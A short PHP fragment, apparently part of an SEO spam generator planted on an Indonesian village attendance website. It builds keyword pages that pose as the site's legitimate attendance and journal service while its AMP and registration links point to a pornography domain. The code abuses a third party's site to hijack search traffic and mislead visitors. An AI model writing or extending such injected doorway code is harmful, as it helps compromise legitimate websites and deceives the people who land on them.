...
$baseAuthor = $BRAND;
$URL  = "https://absensi.smartdesa.id/?ninja=$BRAND";
$PAGEURL = "https://absensi.smartdesa.id/?ninja=$BRAND";
$AMP = "https://bokep-indonesia.pages.dev/$BRAND/";
$DAFTAR = "https://bokep-indonesia.pages.dev/";
...
if ($NUMLIST >= 1 && $NUMLIST <= 31134) {
    $TITLE = "$BRAND # Absensi & Jurnal Online ";
    $DESCRIPTION = "$BRAND adalah platform untuk absensi dan jurnal online yang dirancang untuk memudahkan pengelolaan kehadiran perangkat desa. Aplikasi ini merupakan bagian dari sistem informasi desa yang lebih luas, bertujuan untuk meningkatkan efisiensi dan transparansi dalam administrasi desa.
";
    $description = "$BRAND adalah platform untuk absensi dan jurnal online yang dirancang untuk memudahkan pengelolaan kehadiran perangkat desa. Aplikasi ini merupakan bagian dari sistem informasi desa yang lebih luas, bertujuan untuk meningkatkan efisiensi dan transparansi dalam administrasi desa.
";
}
